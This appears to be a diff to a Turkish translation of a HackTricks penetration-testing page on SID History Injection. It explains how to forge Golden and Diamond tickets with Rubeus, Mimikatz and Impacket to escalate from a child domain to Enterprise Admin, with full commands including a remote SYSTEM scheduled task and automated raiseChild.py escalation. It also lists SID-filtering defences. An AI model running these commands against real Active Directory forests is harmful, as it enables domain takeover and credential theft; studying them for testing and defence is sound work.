@@ -4,31 +4,31 @@
 
 ## SID History Injection Attack
 
-**SID History Injection Attack**'ın odak noktası, **kullanıcıların alanlar arasında göçünü** sağlarken, eski alanın kaynaklarına erişimin devamını temin etmektir. Bu, kullanıcının önceki Güvenlik Tanımlayıcısının (SID) yeni hesabının SID Geçmişine **dahil edilmesiyle** gerçekleştirilir. Özellikle, bu süreç, ana alandan yüksek ayrıcalıklı bir grubun (örneğin, Enterprise Admins veya Domain Admins) SID'sini SID Geçmişine ekleyerek yetkisiz erişim sağlamak için manipüle edilebilir. Bu istismar, ana alandaki tüm kaynaklara erişim sağlar.
+**SID History Injection Attack**'in amacı, eski domain'deki kaynaklara erişimin devam etmesini sağlarken **user migration between domains** işlemlerine yardımcı olmaktır. Bu işlem, kullanıcının önceki Security Identifier'ının (SID) yeni hesabının **SID History** alanına eklenmesiyle gerçekleştirilir. Özellikle, parent domain'deki yüksek ayrıcalıklı bir grubun (örneğin Enterprise Admins veya Domain Admins) SID'si SID History alanına eklenerek bu süreç manipüle edilebilir. Bu istismar, parent domain içindeki tüm kaynaklara erişim sağlar.<sup>[[1]](#references)[[2]](#references)</sup>
 
-Bu saldırıyı gerçekleştirmek için iki yöntem vardır: ya bir **Golden Ticket** ya da bir **Diamond Ticket** oluşturmak.
+Bu saldırıyı gerçekleştirmek için iki yöntem vardır: **Golden Ticket** veya **Diamond Ticket** oluşturmak.
 
-**"Enterprise Admins"** grubunun SID'sini belirlemek için, önce kök alanın SID'sini bulmak gerekir. Tanımlamanın ardından, Enterprise Admins grubunun SID'si, kök alanın SID'sine `-519` eklenerek oluşturulabilir. Örneğin, kök alan SID'si `S-1-5-21-280534878-1496970234-700767426` ise, "Enterprise Admins" grubunun sonuçta elde edilen SID'si `S-1-5-21-280534878-1496970234-700767426-519` olacaktır.
+**"Enterprise Admins"** grubunun SID'sini belirlemek için öncelikle root domain'in SID'sini bulmak gerekir. Bu SID belirlendikten sonra, root domain'in SID'sine `-519` eklenerek Enterprise Admins grubunun SID'si oluşturulabilir. Örneğin, root domain SID'si `S-1-5-21-280534878-1496970234-700767426` ise, "Enterprise Admins" grubunun SID'si `S-1-5-21-280534878-1496970234-700767426-519` olur.<sup>[[1]](#references)</sup>
 
-Ayrıca, **512** ile biten **Domain Admins** gruplarını da kullanabilirsiniz.
+Ayrıca sonu **512** ile biten **Domain Admins** gruplarını da kullanabilirsiniz.
 
-Diğer bir alanın (örneğin "Domain Admins") grubunun SID'sini bulmanın başka bir yolu:
+Başka bir domain'deki bir grubun (örneğin "Domain Admins") SID'sini bulmanın başka bir yolu şöyledir:
 ```bash
 Get-DomainGroup -Identity "Domain Admins" -Domain parent.io -Properties ObjectSid
 ```
 > [!WARNING]
-> SID geçmişini bir güven ilişkisi içinde devre dışı bırakmanın bu saldırının başarısız olmasına neden olabileceğini unutmayın.
+> Bir trust relationship içinde SID history'yi devre dışı bırakmanın mümkün olduğunu ve bunun bu attack'in başarısız olmasına neden olacağını unutmayın.
 
-[**docs**](https://technet.microsoft.com/library/cc835085.aspx) göre:
-- **Orman güvenlerinde SIDHistory'yi devre dışı bırakma** netdom aracı kullanılarak (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
-- **Dış güvenlere SID Filtreleme Karantinası uygulama** netdom aracı kullanılarak (`netdom trust /domain: /quarantine:yes on the domain controller`)
-- **Tek bir orman içindeki alan güvenlerine SID Filtreleme uygulamak** önerilmez çünkü bu desteklenmeyen bir yapılandırmadır ve kırıcı değişikliklere neden olabilir. Eğer bir orman içindeki bir alan güvenilir değilse, o ormanın üyesi olmamalıdır. Bu durumda, güvenilir ve güvenilir olmayan alanların ayrı ormanlara bölünmesi ve burada SID Filtrelemenin bir ara orman güvenine uygulanması gereklidir.
+[**docs**](https://technet.microsoft.com/library/cc835085.aspx)'a göre:<sup>[[3]](#references)</sup>
+- netdom tool'u kullanarak **forest trust'larda SIDHistory'yi devre dışı bırakma** (`netdom trust /domain: /EnableSIDHistory:no on the domain controller`)
+- netdom tool'u kullanarak **external trust'lara SID Filter Quarantining uygulama** (`netdom trust /domain: /quarantine:yes on the domain controller`)
+- **Tek bir forest içindeki domain trust'larına SID Filtering uygulamak** önerilmez; çünkü bu desteklenmeyen bir configuration'dır ve breaking change'lere neden olabilir. Bir forest içindeki domain güvenilir değilse forest'ın üyesi olmamalıdır. Bu durumda öncelikle trusted ve untrusted domain'leri ayrı forest'lara ayırmak, ardından SID Filtering'in uygulanabileceği bir interforest trust oluşturmak gerekir.
 
-Bu konuda daha fazla bilgi için bu gönderiyi kontrol edin: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
+Bunu bypass etme hakkında daha fazla bilgi için şu post'a bakın: [**https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4**](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
 
 ### Diamond Ticket (Rubeus + KRBTGT-AES256)
 
-Bunu en son denediğimde **`/ldap`** argümanını eklemem gerekti.
+Bunu en son denediğimde **`/ldap`** arg'ını eklemem gerekti.
 ```bash
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap /ldap
@@ -61,7 +61,7 @@ mimikatz.exe "kerberos::golden /user:Administrator /domain:<current_domain> /sid
 # The previous command will generate a file called ticket.kirbi
 # Just loading you can perform a dcsync attack agains the domain
 ```
-Daha fazla bilgi için golden ticket'lar hakkında kontrol edin:
+Golden tickets hakkında daha fazla bilgi için:
 
 
 {{#ref}}
@@ -69,7 +69,7 @@ golden-ticket.md
 {{#endref}}
 
 
-Daha fazla bilgi için diamond ticket'lar hakkında kontrol edin:
+Diamond tickets hakkında daha fazla bilgi için:
 
 
 {{#ref}}
@@ -80,7 +80,7 @@ diamond-ticket.md
 .\kirbikator.exe lsa .\CIFS.mcorpdc.moneycorp.local.kirbi
 ls \\mcorp-dc.moneycorp.local\c$
 ```
-Kompromize edilmiş alanın KRBTGT hash'ini kullanarak kök veya Enterprise admin'e yükseltin:
+Ele geçirilmiş domain’in KRBTGT hash’ini kullanarak root’un DA’sına veya Enterprise admin’e ayrıcalık yükseltin:
 ```bash
 Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-211874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\Tools\krbtgt_tkt.kirbi"'
 
@@ -92,7 +92,8 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC Weekely /RU "NT Authority\SYSTE
 
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck114"
 ```
-Elde edilen izinlerle, yeni alanda örneğin bir DCSync saldırısı gerçekleştirebilirsiniz:
+Saldırıyla elde edilen izinlerle yeni domain'de örneğin bir DCSync attack gerçekleştirebilirsiniz:
+
 
 {{#ref}}
 dcsync.md
@@ -100,7 +101,7 @@ dcsync.md
 
 ### Linux'tan
 
-#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) ile Manuel
+#### [ticketer.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ticketer.py) ile manuel olarak
 ```bash
 # This is for an attack from child to root domain
 # Get child domain SID
@@ -120,27 +121,28 @@ export KRB5CCNAME=hacker.ccache
 # psexec in domain controller of root
 psexec.py <child_domain>/Administrator@dc.root.local -k -no-pass -target-ip 10.10.10.10
 ```
-#### Automatic using [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py)
+#### [raiseChild.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/raiseChild.py) kullanarak otomatik
 
-Bu, **çocuk alanından ebeveyn alanına yükseltmeyi otomatikleştiren** bir Impacket betiğidir. Betiğin ihtiyaçları:
+Bu, **child domain'den parent domain'e yükseltmeyi otomatikleştiren** bir Impacket script'idir. Script şunlara ihtiyaç duyar:
 
-- Hedef alan denetleyicisi
-- Çocuk alanındaki bir yönetici kullanıcısı için kimlik bilgileri
+- Hedef Domain Controller
+- Child domain'deki bir admin kullanıcısının bilgileri
 
 Akış şu şekildedir:
 
-- Ebeveyn alanının Enterprise Admins grubunun SID'sini alır
-- Çocuk alanındaki KRBTGT hesabının hash'ini alır
+- Parent domain'deki Enterprise Admins grubunun SID'sini alır
+- Child domain'deki KRBTGT hesabının hash'ini alır
 - Bir Golden Ticket oluşturur
-- Ebeveyn alanına giriş yapar
-- Ebeveyn alanındaki Administrator hesabı için kimlik bilgilerini alır
-- Eğer `target-exec` anahtarı belirtilmişse, Psexec aracılığıyla ebeveyn alanının Alan Denetleyicisi'ne kimlik doğrulaması yapar.
+- Parent domain'e giriş yapar
+- Parent domain'deki Administrator hesabının kimlik bilgilerini alır
+- `target-exec` switch'i belirtilirse, Psexec üzerinden parent domain'in Domain Controller'ına authentication yapar.
 ```bash
 raiseChild.py -target-exec 10.10.10.10 <child_domain>/username
 ```
-## Referanslar
+## Kaynaklar
 
-- [https://adsecurity.org/?p=1772](https://adsecurity.org/?p=1772)
-- [https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
+- [1] [Sneaky Active Directory Persistence #14: SID History - adsecurity.org](https://adsecurity.org/?p=1772)
+- [2] [Security Identifier (SID) nedir? - SentinelOne](https://www.sentinelone.com/blog/windows-sid-history-injection-exposure-blog/)
+- [3] [Trusts için Güvenlik Hususları - Microsoft TechNet](https://technet.microsoft.com/library/cc835085.aspx)
 
 {{#include ../../banners/hacktricks-training.md}}
